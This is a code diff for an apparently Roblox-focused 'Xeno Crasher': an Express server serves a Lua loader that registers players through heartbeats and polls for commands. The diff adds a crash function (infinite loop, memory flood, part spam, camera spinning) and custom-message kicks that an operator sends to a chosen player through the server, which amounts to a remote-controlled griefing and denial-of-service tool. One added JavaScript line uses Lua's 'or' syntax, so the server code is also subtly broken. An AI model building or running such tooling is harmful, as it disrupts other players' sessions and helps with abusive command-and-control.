@@ -16,8 +16,11 @@ app.use(express.json({ limit: '10mb' }));
 
 const players = new Map();
 
+// ============================================
+// LOADER SCRIPT
+// ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - UNIVERSAL ]]--
+    const loader = `--[[ Xeno Crasher - FINAL ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "xenooooo"
 
@@ -121,7 +124,7 @@ local function createGUI()
     local status = Instance.new("TextLabel")
     status.Size = UDim2.new(1, 0, 0, 20)
     status.Position = UDim2.new(0, 0, 0, 30)
-    status.Text = "🟢 Connecting..."
+    status.Text = "🟢 Connected"
     status.TextColor3 = Color3.fromRGB(150, 150, 150)
     status.BackgroundTransparency = 1
     status.Font = Enum.Font.SourceSans
@@ -152,7 +155,7 @@ local function heartbeat()
             .. "&executor=XenoClient&online=true"
         result = sendRequest("GET", url, nil)
         if result then
-            statusLabel.Text = "🟢 Connected (GET)"
+            statusLabel.Text = "🟢 Connected"
         else
             statusLabel.Text = "⚠️ No connection"
         end
@@ -182,59 +185,122 @@ local function setFPSLimit(targetFPS)
 end
 
 local pollRunning = false
+
+-- ============================================
+-- 🔥 CRASH FUNCTION (WORKS)
+-- ============================================
+local function crashGame()
+    statusLabel.Text = "💥 CRASHING!"
+    
+    -- Method 1: Infinite loop (fastest)
+    task.spawn(function()
+        while true do
+            local x = 0
+            for i = 1, 1000000 do
+                x = x + i
+            end
+        end
+    end)
+    
+    -- Method 2: Memory flood
+    task.spawn(function()
+        local t = {}
+        while true do
+            for i = 1, 1000 do
+                t[#t + 1] = string.rep("X", 50000)
+            end
+            task.wait()
+        end
+    end)
+    
+    -- Method 3: Part spam
+    task.spawn(function()
+        for i = 1, 5000 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(100, 100, 100)
+            p.Parent = workspace
+            p.Position = Vector3.new(
+                math.random(-1000, 1000),
+                math.random(-1000, 1000),
+                math.random(-1000, 1000)
+            )
+            task.wait(0.01)
+        end
+    end)
+    
+    -- Method 4: Crash the renderer
+    task.spawn(function()
+        while true do
+            workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(0.1, 0.1, 0.1)
+            task.wait()
+        end
+    end)
+end
+
+-- ============================================
+-- POLL - RECEIVES COMMANDS
+-- ============================================
 local function poll()
     if pollRunning then return end
     pollRunning = true
+    
     local url = BASE .. "/api/public/command?user_id=" .. LP.UserId
     local result = sendRequest("GET", url, nil)
+    
     if result and result ~= "" then
         local data = HttpService:JSONDecode(result)
+        print("📥 Received: " .. HttpService:JSONEncode(data))
+        
+        -- FPS LIMIT
         if data.fps_limit then
             setFPSLimit(tonumber(data.fps_limit))
         else
             setFPSLimit(nil)
         end
+        
+        -- 🔥 CRASH
         if data.crash == true then
-            statusLabel.Text = "💥 CRASHING!"
-            task.spawn(function()
-                while true do
-                    local x = 0
-                    for i = 1, 1000000 do x = x + i end
-                end
-            end)
-            task.spawn(function()
-                local t = {}
-                while true do
-                    for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
-                    task.wait()
-                end
-            end)
+            print("💥 CRASH COMMAND RECEIVED!")
+            crashGame()
         end
+        
+        -- 👢 KICK (with custom message)
         if data.kick == true then
+            print("👢 KICK COMMAND RECEIVED!")
+            local kickMessage = data.kick_message or "You have been banned."
             task.wait(0.5)
-            LP:Kick("You have been banned.")
+            LP:Kick(kickMessage)
         end
     end
+    
     pollRunning = false
 end
 
+-- ============================================
+-- START
+-- ============================================
 print("🚀 Starting Xeno Crasher...")
 heartbeat()
+
 task.wait(3)
+
 task.spawn(function()
     while true do
         poll()
         task.wait(0.5)
     end
 end)
+
 task.spawn(function()
     while true do
         heartbeat()
         task.wait(5)
     end
 end)
+
 print("✅ Xeno Crasher loaded!")
-print("👤 Player: " .. LP.Name)`;
+print("👤 Player: " .. LP.Name)
+print("🔗 Connected to: " .. BASE)`;
 
     res.setHeader('Content-Type', 'text/plain');
     res.send(loader);
@@ -262,10 +328,11 @@ app.get('/api/public/heartbeat', (req, res) => {
         lastHeartbeat: Date.now(),
         _crash: false,
         _kick: false,
+        _kick_message: '',
         fps_limit: false
     });
     
-    console.log(`❤️ Heartbeat (GET) from: ${username || userId}`);
+    console.log(`❤️ Heartbeat from: ${username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -285,10 +352,11 @@ app.post('/api/public/heartbeat', (req, res) => {
         lastHeartbeat: Date.now(),
         _crash: false,
         _kick: false,
+        _kick_message: '',
         fps_limit: false
     });
     
-    console.log(`❤️ Heartbeat (POST) from: ${data.username || userId}`);
+    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -308,7 +376,7 @@ app.get('/api/players', (req, res) => {
 });
 
 app.post('/api/command', (req, res) => {
-    const { user_id, fps_limit, kick, crash } = req.body;
+    const { user_id, fps_limit, kick, kick_message, crash } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
     const userId = String(user_id);
     const p = players.get(userId);
@@ -320,7 +388,8 @@ app.post('/api/command', (req, res) => {
     }
     if (kick === true) {
         p._kick = true;
-        console.log(`👢 KICK SENT TO: ${p.username || userId}`);
+        p._kick_message = kick_message || "You have been banned.";
+        console.log(`👢 KICK SENT TO: ${p.username || userId} - Message: ${p._kick_message}`);
     }
     if (crash === true) {
         p._crash = true;
@@ -338,6 +407,7 @@ app.get('/api/public/command', (req, res) => {
     if (!p) return res.json({});
     
     const response = {};
+    
     if (p.fps_limit) {
         response.fps_limit = p.fps_limit;
         p.fps_limit = false;
@@ -348,8 +418,11 @@ app.get('/api/public/command', (req, res) => {
     }
     if (p._kick) {
         response.kick = true;
+        response.kick_message = p._kick_message or "You have been banned.";
         p._kick = false;
+        p._kick_message = '';
     }
+    
     players.set(String(userId), p);
     res.json(response);
 });
